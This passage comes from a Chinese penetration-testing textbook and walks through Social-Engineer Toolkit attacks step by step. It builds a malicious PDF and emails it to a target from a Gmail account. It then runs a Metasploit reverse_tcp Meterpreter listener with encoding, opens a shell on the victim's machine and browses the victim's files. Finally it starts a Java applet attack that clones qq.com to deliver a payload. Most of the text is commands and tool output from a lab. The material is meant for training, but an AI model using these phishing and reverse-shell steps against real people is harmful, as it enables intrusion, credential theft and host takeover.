以上信息显示了攻击的方式。
（6）这里选择第2个模块，如下所示：
set:payloads>2
set>IP address for the payload listener:192.168.41.156#设置攻击主机的地址
set:payloads> Port to connect back on [443]:
#设置攻击主机的端口号
[-] Defaulting to port 443...
[-] Generating fileformat exploit..
[*] Payload creation complete.
[*] All payloads get sent to the /root/.set/template.pdf directory
[-] As an added bonus, use the file-format creator in SET to create your attachment.
·222 ·
---
## Page 235
第7章权限提升
Right now the attachment will be imported with filename oftemplate.
whatever
Do you want to rename the file?
example Enter the new filename: moo.pdf
1. Keep the filename, I don't care.
2. Rename the file, I want to be cool.
从以上输出信息中，可以看到攻击载荷创建完成。所有攻击载荷保存在/root/.set/中，
文件名为template.pdf。
（7)这里选择是否重命名该文件。这里使用默认的PDF文件template.pdf，输入编号1，
如下所示：
set:phishing>1
[*] Keeping the filename and moving on.
Social Engineer Toolkit Mass E-Mailer
There are two options on the mass e-mailer, the first would
be to send an email to one individual person. The second option
will allow you to import a list and send it to as many people as
you want within that list.
What do you want to do:
1.E-Mail Attack Single Email Address
2.E-Mail Attack Mass Mailer
99.Retum to main menu.
输出信息显示了邮件攻击的方式。
W
（8）这里选择针对单一邮件地址进行攻击，输入编号，如下所示：
set:phishing>1
Do you want to use a predefined template or craft
a one time email template.
1. Pre-Defined Template
2. One-Time Use Email Template
输出的信息提示是否要使用一个预先定义的模块。SET允许攻击者创建不同的模板，
并且在使用时支持动态导入。
（9）这里使用预先定义的模块，输入编号1，如下所示：
set:phishing>1
[-] Available templates:
1: Have you seen this?
2: How long has it been?
3: Strange intermet usage from your computer
4: Status Report
5: New Update
6:Computer Issue
7: Dan Brown's Angels & Demons
8:Order Confirmation
9: WOAAAA!!!! This is crazy...
10: Baby Pics
输出的信息显示了所有可用的模块，
（10）这里选择使用预先定义的SET邮件模板StatusReport，输入编号4，如下所示：
set:phishing>4
set:phishing> Send email to:********@126.com
#设置发送邮件的目的地址
·223 ·
---
## Page 236
第3篇各种渗透测试
1. Use a gmail Account for your email attack.
2. Use your own server or open relay
输出信息显示了给目标主机发送地址的方法。
（11）这里选择使用Gmail邮箱账号，输入编号1，如下所示：
set:phishing>1
set:phishing>Your gmailemailaddress:***********@gmail.com#输入Gmail 邮件账户
set:phishing> The FROM NAME user will see: :
Email password:
#输入邮箱密码
:os] s ss s   Setup a listener [yes|no]:
从输出信息中，可以看到SET传递邮件设置完成。此时就可以使用该Gmail账户，给
输入的目的邮件地址（********@126.com）发送恶意文件。最后，提示是否设置一个监听。
（12）这里设置一个监听，用来监听攻击载荷反弹连接。当SET启动Metasploit时，
它已经配置了所有必需的选项，将开始处理攻击主机的IP反向连接到443端口，如下所示：
set:phishing> Setup a listener [yes|no]:yes
***[-]
[-] * WARNING: Database support has been disabled
[-] ***
# cowsay++
II-I| *
Tired of typing 'set RHOSTS'? Click & pwn with Metasploit Pro
-- type 'go_pro' to launch it now.
=[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]
+ -- --=[ 1246 exploits -678 auxiliary - 198 post
+ -- --=[ 324 payloads - 32 encoders - 8 nops
[*] Processing /root/.set/meta_config for ERB directives.
resource (/root/.set/meta_config)> use exploit/multi/handler
resource (/root/.set/meta_config)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (/root/.set/meta_config)> set LHOST 192.168.41.156
LHOST => 192.168.41.156
resource (/root/.set/meta_config)> set LPORT 443
LPORT => 443
resource(/root/.set/meta_config)> set ENCODING shikata_ga_nai
ENCODING => shikata_ga_nai
resource (/root/.set/meta_config)> set ExitOnSession false
ExitOnSession => false
resource (/root/.set/meta_config)> exploit -j
[+] Exploit running as background job.
msf exploit(handler) >
[*] Started reverse handler on 192.168.41.156:443
[*] Starting the payload handler...
msf exploit(handler) >
输出的信息显示了监听攻击载荷的信息。当目标主机打开发送的恶意邮件时，将会自
· 224 *
---
## Page 237
第7章权限提升
动的连接到攻击主机192.168.41.156:443。
此时攻击主机可以将前面创建的template.pdf文件，通过电子邮件发送给目标。当目
标用户打开它并认为是合法的PDF文件时，此时目标主机被立即控制。在攻击主机上，将
看到如下所示的信息：
msf exploit(handler) >
[*] Sending stage (769024 bytes) to 192.168.41.146
[*] Meterpreter session 1 opened (192.168.41.156:443 -> 192.168.41.146:1083) at 2014-06-07
11:17:11 +0800
输出的信息表示，被攻击主机的地址是192.168.41.146。此时，攻击主机与目标主机
成功的建立了一个会话，如下所示：
msf exploit(handler) > sessions
Active sessions
Id Type
Information
Connection
1
meterpreterx86/win32
AA-886OKJM26FSWTest@AA-886OKJM26FSW
192.168.41.156:443 -> 192.168.41.146:1083 (192.168.41.146)
从输出的信息中，可以看到有一个会话。该会话中，描述了目标主机的相关信息。如
操作系统类型为win32、主机名为AA-886OKJM26FSW、登录的用户为Test及主机IP地
址。激活该会话后，就可以在目标主机上进行任何操作。也就说相当于控制了目标主机。
激活会话，如下所示：
msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...
meterpreter>
从输出的信息中可以看到会话1被成功激活。此时就可以在meterpreter命令行下，执
行各种命令。如登录目标主机的Shell，如下所示：
meterpreter> shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 792 created.
Channel 2 created.
Microsoft Windows XP [版本 5.1.2600]
（C）版权所有1985-2001MicrosoftCorp.
C:\Documents and Settings\Testi桌面>
输出信息显示为C:Documents andSettings\Test桌面>，表示成功登录到目标主机。此
时相当于是以Test用户的身份，在目标主机中进行操作。查看当前目录中的文件夹，如下
所示：
C:Documents and Settings\Testi桌面>dir
#列出目录中的所有文件
JIP
驱动器C中的卷没有标签
卷的序列号是1806-07F4
C:DocumentsandSettings\Test桌面的目录
2014-06-07
11:11
2014-06-07
11:11
2014-05-06
19:46
54 111.txt
2014-06-07
11:00
57,364,480 AdbeRdr810_zh_CN.msi
2014-06-06
16:01
46.844 JEdB2oma7AEGV7G.pdf
2014-06-0618:54
6,619 template.pdf
·225 ·
---
## Page 238
第3篇各种渗透测试
4个文件
57，417,997字节
2个目录38.359.552.000可用字节
输出的信息显示了目标主机桌面上的所有文件及目录。还可以查看文件的内容，如下
所示：
C:DocumentsandSettings\Testi桌面>type 111.txt
#查看文件内容
type 111.txt
Ethernetadapter本地连接：
Connection-specific DNS Suffix: localdomain
IP Address.
. . : 192.168.41.146
Subnet Mask
...255.255.255.0
Default Gateway........: 192..168.41.2
输出的信息显示了111.txt文件的内容。
7.4.2Web攻击向量
Web攻击向量会特意构造出一些对目标而言是可信且具有诱惑力的网页。SET中的
Web攻击向量可以复制出和实际运行的可信站点，看起来和网页完全一样。这样，目标用
户以为自己正在访问一个合法的站点，而不会想到是被攻击。本小节将介绍使用SET实现
Web攻击向量。
【实例7-2】下面使用Java applet攻击实现Web攻击向量。具体操作步骤如下所示。
Javaapplet攻击引入了恶意Javaapplet程序进行智能化的浏览器检查，确保applet能
在目标浏览器中正确运行，同时也能在目标主机上运行攻击载荷。Java applet攻击并不被
认为是Java本身的漏洞，只是当受攻击目标浏览恶意网页时，网页会弹出一个警告。该警
告信息询问是否需要运行一个不被信任的Javaapplet程序。由于Java允许用户对一个apple
选择任意名字进行签名，用户可以为它的发布者定义为Google和Microsoft等。这样，很
容易使一些人遭受攻击。
（1）启动社会工程学。执行命令如下所示：
root@kali:~# setoolkit
Select from the menu:
1) Social-Engineering Attacks
2)Fast-TrackPenetration Testing
3) Third Party Modules
4) Update the Metasploit Framework
5) Update the Social-Engineer Toolkit
6) Update SET configuration
99) Exit the Social-Engineer Toolkit
7) Help, Credits, and About
set>
以上输出信息显示了所有的攻击菜单列表。
（2）这里选择社会工程学攻击，输入编号1。将显示如下所示的信息：
set> 1
WW..WW..WWWW.WW....
,MI
Y
MM
MM
7
'MMb.
MM
d
MM
'YMMNq.
MM
'MM
MMY
MM
· 226 ·
---
## Page 239
第7章权限提升
Mb
dM
MM
,M
MM
P"Ybmmd*JMMmmmmMMM
.JMML
[--]
The Social-Engineer Toolkit (SET)
Created by: David Kennedy (ReL1K)
Version: 6.0
[-]
Codename: 'Rebellion’
[--]
Follow us on Twitter: @TrustedSec
[-)
Follow me on Twitter: @HackingDave
[---]
Homepage: https://www.trustedsec.com
[-]
Welcome to the Social-Engineer Toolkit (SET).
The one stop shop for all of your SE needs.
Join us on irc.freenode.net in channel #setoolkit
The Social-Engineer Toolkit is a product of TrustedSec.
Visit:https://www.trustedsec.com
Select from the menu:
1) Spear-Phishing Attack Vectors
2) Website Attack Vectors
3) Infectious Media Generator
4) Create a Payload and Listener
5) Mass Mailer Attack
6) Arduino-Based Attack Vector
7) SMS Spoofing Attack Vector
8) Wireless Access Point Attack Vector
9) QRCode Generator Attack Vector
10) Powershell Attack Vectors
11) Third Party Modules
99)Retun back to the main menu.
set>
输出的信息显示了社会工程学中，可使用的攻击列表。
（3）这里选择Web攻击向量，输入编号2。将显示如下所示的信息：
set> 2
The Web Attack module is a unique way of utilizing multiple web-based attacks in order to
compromise the intended victim.
The Java Applet Attack method will spoof a Java Certificate and deliver a metasploit based
payload. Uses a customized java applet created by Thomas Werth to deliver the payload.
The Metasploit Browser Exploit method will utilize select Metasploit browser exploits through an
iframe and deliver a Metasploit payload.
The Credential Harvester method will utilize web cloning of a web- site that has a username and
password field and harvest all the information posted to the website.
The TabNabbing method will wait for a user to move to a different tab, then refresh the page to
something different.
The Web-Jacking Attack method was introduced by white_sheep, emgent. This method utilizes
iframe replacements to make the highlighted URL link to appear legitimate however when clicked
settings in the set_config if its too slow/fast.
The Multi-Attack method will add a combination of attacks through the web attack menu. For
example you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all
at once to see which is successful.
1) Java Applet Attack Method
2) Metasploit Browser Exploit Method
3)Credential HarvesterAttack Method
4) Tabnabbing Attack Method
5) Web Jacking Attack Method
6) Multi-Attack Web Method
7) Full Screen Attack Method
99) Return to Main Menu
set:webattack>
· 227 ·
---
## Page 240
第3篇各种渗透测试
输出的信息显示了Web攻击向量中，可使用的攻击方法列表。
（4）这里选择Javaapplet攻击方法，输入编号1。将显示如下所示的信息：
set:webattack>1
The first method will allow SET to import a list of pre-defined web
applications that it can utilize within the attack.
The second method will completely clone a website of your choosing
and allow you to utilize the attack vectors within the completely
same web application you were attempting to clone.
The third method allows you to import your own website, note that you
should only have an index.html when using the import website
functionality.
1) Web Templates
2) Site Cloner
3) Custom Import
99) Return to Webattack Menu
set:webattack>
输出的信息显示了Java applet攻击的菜单列表。一般情况下，使用前两种。其中第一
种（Web模块）是社会工程学创建一个一般的网页：第二种（复制网站）是使用已存在的
网页作为一个模块，来攻击网页。
（5）这里选择复制网站，输入编号2。将显示如下所示的信息：
set:webattack>2
[-] NAT/Port Forwarding can be used in the cases where your SET machine is
[-] not extermally exposed and may be a different IP address than your reverse listener.
set> Are you using NAT/Port Forwarding [yes|no]: no
#是否使用NAT/Port转发
[-] Enter the IP address of your interface IP or if your using an external IP, what
[-] will be used for the connection back and to house the web server (your interface address)
set:webattack> IP address or hostname for the reverse connection:192.168.
6.103
#设置攻击主机的地址
-
Java Applet Configuration Options Below
will create a self-signed certificate if you have the java jdk installed. The second option will use the
one built into SET if you have a certificate.
Select which option you want:
1. Make my own self-signed certificate applet.
2. Use the applet built into SET.
3. 1 have my own code signing certificate or applet.
Enter the number you want to use [1-3]: 2
#选择Javaapplet类型
[*] Okay! Using the one built into SET - be careful, self signed isn't accepted in newer versions of
Java :(
[-] SET supports both HTTP and HTTPS
[-] Example: http://www.thisisafakesite.com
set:webattack>Enter theurl toclone:http://www.qq.com#设置复制的网页
[*] Cloning the website: http://www.qq.com
[*] This could take a little bit..
[*] Injecting Java Applet attack into the newly cloned website.
[*] Filename obfuscation complete. Payload name is: vWzsHO